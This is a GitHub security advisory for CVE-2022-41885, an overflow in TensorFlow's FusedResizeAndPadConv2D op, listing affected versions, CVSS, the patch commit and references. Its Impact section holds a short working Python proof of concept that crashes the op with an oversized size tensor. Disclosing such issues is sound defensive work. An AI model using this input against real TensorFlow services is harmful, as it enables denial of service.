# [M] Overflow in `FusedResizeAndPadConv2D`

## Summary
Severity: Medium
Advisory: GHSA-762h-vpvw-3rcx
CVE: CVE-2022-41885
CWE: CWE-131
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-11-21
Source: https://github.com/advisories/GHSA-762h-vpvw-3rcx
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.4
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.4
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.4
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When [`tf.raw_ops.FusedResizeAndPadConv2D`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/conv_ops_fused_image_transform.cc) is given a large tensor shape, it overflows.
```python
import tensorflow as tf

mode = "REFLECT"
strides = [1, 1, 1, 1]
padding = "SAME"
resize_align_corners = False
input = tf.constant(147, shape=[3,3,1,1], dtype=tf.float16)
size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
paddings = tf.constant([3,4], shape=[2], dtype=tf.int32)
filter = tf.constant(123, shape=[1,3,4,1], dtype=tf.float16)
tf.raw_ops.FusedResizeAndPadConv2D(input=input, size=size, paddings=paddings, filter=filter, mode=mode, strides=strides, padding=padding, resize_align_corners=resize_align_corners)
```

### Patches
We have patched the issue in GitHub commit [d66e1d568275e6a2947de97dca7a102a211e01ce](https://github.com/tensorflow/tensorflow/commit/d66e1d568275e6a2947de97dca7a102a211e01ce).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-762h-vpvw-3rcx
- https://nvd.nist.gov/vuln/detail/CVE-2022-41885
- https://github.com/tensorflow/tensorflow/commit/d66e1d568275e6a2947de97dca7a102a211e01ce
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/conv_ops_fused_image_transform.cc
